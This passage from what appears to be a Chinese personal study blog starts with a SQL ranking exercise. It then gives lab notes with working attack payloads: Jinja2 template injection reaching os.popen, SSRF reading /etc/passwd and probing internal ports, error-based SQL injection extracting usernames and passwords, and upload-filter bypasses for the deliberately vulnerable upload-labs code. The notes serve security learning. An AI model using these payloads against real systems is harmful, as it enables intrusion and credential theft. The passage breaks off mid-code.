<li><code>adventurer_id</code>：冒险者ID，唯一标识每个冒险者。</li>
<li><code>adventurer_name</code>：冒险者姓名。</li>
<li><code>task_id</code>：任务ID，唯一标识每个任务。</li>
<li><code>task_name</code>：任务名称。</li>
<li><code>reward_coins</code>：冒险者在该任务中获得的金币奖励数量。</li>
</ul>
<p>请你编写一条 SQL 查询语句，依次输出每个冒险者的 id（<code>adventurer_id</code>）、冒险者姓名（<code>adventurer_name</code>）、获得的总金币奖励（<code>total_reward_coins</code>），并按照总金币奖励从高到低排序，其中只列出总金币奖励排名前 3 的冒险者。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select distinct adventurer_id,adventurer_name,</span><br><span class="line">    sum(reward_coins) over</span><br><span class="line">    (partition by adventurer_id) as total_reward_coins</span><br><span class="line"> from rewards</span><br><span class="line">order by total_reward_coins desc  </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>怎么输出前三呢</p>
<p>好吧 <strong>limit</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select distinct adventurer_id,adventurer_name,</span><br><span class="line">    sum(reward_coins) over</span><br><span class="line">    (partition by adventurer_id) as total_reward_coins</span><br><span class="line"> from rewards</span><br><span class="line">order by total_reward_coins desc limit 3</span><br></pre></td></tr></table></figure>



<p><strong>分组聚合</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select distinct adventurer_id,adventurer_name,</span><br><span class="line">            sum(reward_coins) as total_reward_coins</span><br><span class="line">from rewards</span><br><span class="line">group by adventurer_id,adventurer_name</span><br><span class="line">order by total_reward_coins desc limit 3</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>sql语法</category>
      </categories>
      <tags>
        <tag>sql语法</tag>
      </tags>
  </entry>
  <entry>
    <title>vulfocus</title>
    <url>/2023/05/13/vulfocus/</url>
    <content><![CDATA[<h1 id="一、ssti"><a href="#一、ssti" class="headerlink" title="一、ssti"></a>一、ssti</h1><h2 id="1-初识"><a href="#1-初识" class="headerlink" title="1.初识"></a>1.初识</h2><p>服务器端模板注入(Server-Side Template Injection)，注入思路参照SQL注入</p>
<p><a href="https://blog.csdn.net/Manuffer/article/details/120739989?ops_request_misc=%7B%22request_id%22:%22168670658916782427434845%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168670658916782427434845&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-120739989-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=ssti&spm=1018.2226.3001.4187">SSTI模板注入总结_L1am0ur的博客-CSDN博客</a></p>
<h2 id="2-漏洞诱因"><a href="#2-漏洞诱因" class="headerlink" title="2.漏洞诱因"></a>2.漏洞诱因</h2><p><strong>render_template</strong>渲染函数的问题</p>
<p>渲染函数在渲染的时候，往往对用户输入的变量不做渲染。</p>
<p>例如：<code>&#123;&#123;&#125;&#125;</code>在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把<code>&#123;&#123;&#125;&#125;</code>包裹的内容当做变量解析替换。比如<code>&#123;&#123;1+1&#125;&#125;</code>会被解析成<code>2</code>。如此一来就可以实现如同sql注入一样的注入漏洞。</p>
<h2 id="3-ssti类型"><a href="#3-ssti类型" class="headerlink" title="3.ssti类型"></a>3.ssti类型</h2><p>网站模板引擎有jinja2、tornado、smarty、twig等等</p>
<p><img src="/../../../Typora/img111/image-20230614094024200.png" alt="ssti类型"></p>
<h2 id="4-常用类"><a href="#4-常用类" class="headerlink" title="4.常用类"></a>4.常用类</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__class__用来查看变量所属的类，格式为变量.__class__</span><br><span class="line"></span><br><span class="line">eg:&gt;&gt;&gt; &#123;&#125;.__class__</span><br><span class="line">&lt;class &#x27;dict&#x27;&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__bases__用来查看类的基类，注意是类的基类，所以格式为变量.__class__.__bases__</span><br><span class="line">同时也能加上数组，比如变量.__class__.__bases__[0]来获得第一个基类。</span><br><span class="line"></span><br><span class="line">eg:&gt;&gt;&gt; &#123;&#125;.__class__.__bases__</span><br><span class="line">(&lt;class &#x27;object&#x27;&gt;,)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__subclasses__()查看当前类的子类`，格式`变量.__class__.__bases__[0].__subclasses__()`</span><br><span class="line">这个类也可以加数组来查看指定的索引值，例如`变量.__class__.__bases__[0].__subclasses__()[1]</span><br><span class="line"></span><br><span class="line">eg:&gt;&gt;&gt; &#x27;&#x27;.__class__.__bases__[0].__subclasses__()[0]</span><br><span class="line">&lt;class &#x27;type&#x27;&gt;</span><br></pre></td></tr></table></figure>

<h2 id="5-利用方法"><a href="#5-利用方法" class="headerlink" title="5.利用方法"></a>5.利用方法</h2><p>示例：变量.<strong>class</strong>.<strong>bases</strong>[0].<strong>subclasses</strong>()[138].<strong>init</strong>.__globals__，init初始化类，然后globals全局来查找所有的方法及变量及参数。</p>
<p>由此我们可以看到各种各样的参数方法函数，去找一个可利用的function来执行，比如popen的话，就可以这样利用：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">**&#x27;&#x27;.___class__.base__[0].__subclass__()[138].__init__.__globals__[&#x27;popen&#x27;](&#x27;dir&#x27;).read()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?flag=&#123;&#123;config.__class__.__init__.__globals__[%27os%27].popen(%27ls%27).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h1 id="二、vulfocus"><a href="#二、vulfocus" class="headerlink" title="二、vulfocus"></a>二、vulfocus</h1><p><code>http://123.58.224.8:21855/1.php?url=https://gimg2.baidu.com/image_search/src=http%3A%2F%2Finews.gtimg.com%2Fnewsapp_bt%2F0%2F14008664378%2F1000</code></p>
<blockquote>
<p>{“err_no”:1,”err_msg”:”input data error”,”request_id”:3676472870}1</p>
</blockquote>
<p>123.58.224.8:21855&#x2F;1.php?url&#x3D;<a href="https://www.baidu.com/">https://www.baidu.com</a></p>
<p>该功能可以访问输入的url</p>
<p><a href="http://123.58.224.8:13880/1.php?url=file:///etc/passwd">http://123.58.224.8:13880/1.php?url=file:///etc/passwd</a></p>
<blockquote>
<p>root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin _apt:x:100:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin 1</p>
</blockquote>
<p><a href="http://123.58.224.8:13880/1.php?url=dict://127.0.0.1:80">http://123.58.224.8:13880/1.php?url=dict://127.0.0.1:80</a> &#x2F;&#x2F;探测内网信息</p>
<p><img src="/../../../Typora/img111/image-20230630195601521.png"></p>
<p>哎，网页体验一言难尽，总是连接失败。</p>
]]></content>
      <categories>
        <category>vulfocus靶场</category>
      </categories>
      <tags>
        <tag>vulfocus靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入之报错注入</title>
    <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="报错注入函数"><a href="#报错注入函数" class="headerlink" title="报错注入函数"></a>报错注入函数</h2><p>**updatexml()**，注意，该函数最多显示32位，必要时搭配substr()函数使用</p>
<p><strong>extravtvalue()</strong></p>
<p>floor()、rand()…主键重复方式，暂时不展开</p>
<h2 id="报错注入思想"><a href="#报错注入思想" class="headerlink" title="报错注入思想"></a>报错注入思想</h2><p>语法格式：updatexml(XML_document,Xpath_string,new_value)</p>
<blockquote>
<p>XML_document:是字符串String格式，为XML文档对象名称</p>
<p>Xpath_string:Xpath格式的字符串</p>
<p>new_value:string格式，替换查找到的符合条件的数据</p>
</blockquote>
<p>如果人为构造Xpath_string格式错误，也就是我们将Xpath_string的值传递成不符合格式的参数<strong>（即出现了符号’~’或’^’,’!’等）</strong>，mysql就会报错</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查询当前数据库的用户信息以及数据库版本信息:</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,user(),0x7e,version(),0x7e),3) --+</span><br><span class="line">获取当前数据库下数据表信息：</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),3) --+</span><br><span class="line">获取users表名的列名信息：</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e),3) --+</span><br><span class="line">获取users数据表下username、password两列名的用户字段信息:</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),3) --+</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),3) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>语法格式：extractvalue()函数语法:extractvalue(XML_document,XPath_string)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取当前是数据库名称及使用mysql数据库的版本信息：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,database(),0x7e,version(),0x7e)) --+</span><br><span class="line">获取当前位置所用数据库的位置：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,@@datadir,0x7e)) --+</span><br><span class="line">获取表名：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)) --+</span><br><span class="line">获取users表的列名：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e)) --+</span><br><span class="line">获取对应的列名的信息(username/password):</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select username from users limit 0,1),0x7e)) --+</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>web漏洞</category>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>报错注入</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs</title>
    <url>/2023/05/20/upload-labs/</url>
    <content><![CDATA[<h1 id="1-12部分"><a href="#1-12部分" class="headerlink" title="1-12部分"></a>1-12部分</h1><h2 id="Pass-1-白名单后缀绕过"><a href="#Pass-1-白名单后缀绕过" class="headerlink" title="Pass 1(白名单后缀绕过)"></a>Pass 1(白名单后缀绕过)</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>1.关闭浏览器的js。</p>
<p>2.上传符合要求的文件，再bp改名为php</p>
<h2 id="Pass-2-白名单MIME绕过"><a href="#Pass-2-白名单MIME绕过" class="headerlink" title="Pass 2(白名单MIME绕过)"></a>Pass 2(白名单MIME绕过)</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>源代码为检测content-type</p>
<blockquote>
<p>$_FILES[表单中参数名][文件自带属性如(name&#x2F;type&#x2F;size)]</p>
<p>$_FILES[‘myfile’][‘name’]</p>
<p>$_FILES[‘myfile’][‘size’]</p>
<p>$_FILES[‘myfile’][‘type’]</p>
</blockquote>
<blockquote>
<p>&lt;form …&gt;<br> &lt;input class&#x3D;”input_file” type&#x3D;”file” name&#x3D;”myfile”&#x2F;&gt;<br> …<br>&lt;&#x2F;form&gt;</p>
</blockquote>
<p>bp改正即可。</p>
<h3 id="Pass-3-黑名单特殊名解析"><a href="#Pass-3-黑名单特殊名解析" class="headerlink" title="Pass 3(黑名单特殊名解析)"></a>Pass 3(黑名单特殊名解析)</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">      <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">      <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">      <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">      <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">      <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">      <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">          <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">          <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;            </span><br><span class="line">          <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">               <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>trim(a,b) 去掉a中的b字符或去空</p>
</blockquote>
<blockquote>
<p>strrch(a,b) 截取字符串a中，从b开始到结束的子串，如：</p>
<p>echo strrchr(“I love Shanghai!”,”Shanghai”);即显示Shanghai!</p>
</blockquote>
<blockquote>
<p>in_array(search,array)，在后者数组中搜索特定值，如：</p>
<p>$people &#x3D; array(“Bill”, “Steve”, “Mark”, “David”);</p>
<p>if (in_array(“Mark”, $people))<br>      {<br>      echo “匹配已找到”;<br>      }</p>
</blockquote>
<p>最后完成了时间重命名。</p>
<p>如上，有些黑名单，但有些其他的文件比如php5，phtml，php3</p>
<h3 id="Pass-4-黑名单-htaccess"><a href="#Pass-4-黑名单-htaccess" class="headerlink" title="Pass 4(黑名单.htaccess)"></a>Pass 4(黑名单.htaccess)</h3><p><code>$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.ini&quot;);</code></p>
<p>法1：</p>
<p>当.htaccess文件被放置在一个 “通过Apache Web服务器加载 “的目录中时，.htaccess文件会被Apache Web服务器软件检测并执行。这些.htaccess文件可以用来改变Apache Web服务器软件的配置，以启用&#x2F;禁用Apache Web服务器软件所提供的额外功能和特性。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;mm.jpg&quot;&gt; </span><br><span class="line"></span><br><span class="line">setHandler application/x-httpd-php </span><br><span class="line"></span><br><span class="line">&lt;/FilesMatch&gt; </span><br></pre></td></tr></table></figure>

<p>将mm.jpg以php解析</p>
<p>条件：</p>
<ul>
<li>apache服务器</li>
<li>能够上传.htaccess文件</li>
<li>httpd.conf中AllowOverride All</li>
<li>httpd.conf中有LoadModule rewrite_module modules&#x2F;mod_rewrite.so</li>
<li>上传目录具有可执行权限</li>
</ul>
<p>法2：</p>
<p>由代码知，去空格，删除点，去除::$DATA等都只执行一次，所以bp修改后缀名**php. .**即可</p>
<h2 id="Pass-5-黑名单-user-ini-x2F-代码审计"><a href="#Pass-5-黑名单-user-ini-x2F-代码审计" class="headerlink" title="Pass 5(黑名单.user.ini&#x2F;代码审计)"></a>Pass 5(黑名单.user.ini&#x2F;代码审计)</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">       <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">       <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">       <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">       <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">       <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure>

<p>法1：构造后缀名.php. .</p>
<p>法2：.user.ini</p>
<h2 id="Pass-6-黑名单大小写"><a href="#Pass-6-黑名单大小写" class="headerlink" title="Pass 6(黑名单大小写)"></a>Pass 6(黑名单大小写)</h2><p>少了strtolower函数，故bp改下php后缀大小写即可。</p>
<h2 id="Pass-7-黑名单空格绕过"><a href="#Pass-7-黑名单空格绕过" class="headerlink" title="Pass 7(黑名单空格绕过)"></a>Pass 7(黑名单空格绕过)</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br></pre></td></tr></table></figure>

<p>代码没有trim()函数，bp构造**.php(空格)** 即可</p>
<h2 id="Pass-8-黑名单"><a href="#Pass-8-黑名单" class="headerlink" title="Pass 8(黑名单)"></a>Pass 8(黑名单)</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>); </span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure>

<p>没有delot()函数，</p>
<p>**构造后缀.php.**即可</p>
<h2 id="Pass-9-黑名单"><a href="#Pass-9-黑名单" class="headerlink" title="Pass 9(黑名单)"></a>Pass 9(黑名单)</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">       <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">       <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">       <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">       <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass 13"></a>Pass 13</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span 